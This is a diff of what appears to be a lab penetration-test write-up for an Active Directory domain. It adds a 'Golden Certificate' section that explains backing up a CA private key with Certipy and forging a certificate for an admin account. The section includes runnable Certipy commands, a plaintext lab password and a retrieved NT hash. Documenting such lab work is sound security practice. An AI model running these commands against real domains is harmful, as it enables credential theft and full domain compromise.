@@ -561,10 +561,19 @@ ADCS        10.0.16.22      389    RUN-SRV          Found CN: tri-CA
 ```
 
 ### Privilege Escalation
-#### ESC7
+#### Golden Certificate Attack
+After gaining local administrative access to the Certificate Authority (CA) server, an attacker can abuse this privilege to perform a **Golden Certificate** attack. This attack allows the creation of arbitrary certificates that are fully trusted by Active Directory because they are signed using the compromised CA’s private key. This is conceptually similar to forging a Kerberos “Golden Ticket” using a compromised `krbtgt` account.
+
+To execute this attack, the CA’s certificate and private key must first be obtained. This can be accomplished using Certipy’s CA backup functionality, which exports the CA private key when sufficient privileges are present.
+
+Once the CA private key is available, a forged certificate can be generated for a target privileged account. In this case, a certificate was forged for the account **j.reed_adm** by embedding its User Principal Name (UPN) and Security Identifier (SID) into the certificate and signing it with the trusted CA key.
+
+The forged certificate was then used to authenticate to the Domain Controller via Kerberos PKINIT (certificate-based authentication). Because the certificate was signed by a trusted CA and contained valid identity attributes, Active Directory accepted it and issued a legitimate Ticket Granting Ticket (TGT) for the target account. This process bypasses the account’s password and any interactive authentication controls.
+
+Authentication using the forged certificate succeeded, and the NTLM hash for the account was successfully retrieved, confirming full compromise of the account’s credentials.
 
 ```zsh
-certipy forge -ca-pfx tri-CA.pfx -upn j.reed_adm@tri.lab -sid S-1-5-21-542797205-3952052766-1175187200-1109 -crl ldap:///
+➜ certipy ca -backup -ca "tri-CA" -username "m.pearson@tri.lab" -password "2silver" -dc-ip "10.0.16.22" -target SWIM-SRV
 
 ➜ certipy forge -ca-pfx tri-CA.pfx -upn j.reed_adm@tri.lab -sid S-1-5-21-542797205-3952052766-1175187200-1109 -crl ldap:///
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -587,7 +596,6 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'j.reed_adm'
 [*] Got hash for 'j.reed_adm@tri.lab': aad3b435b51404eeaad3b435b51404ee:213846abdca7279a77229f6b422263fe
 ```
-
 
 ## RUN-SRV
 ### Domain Compromise
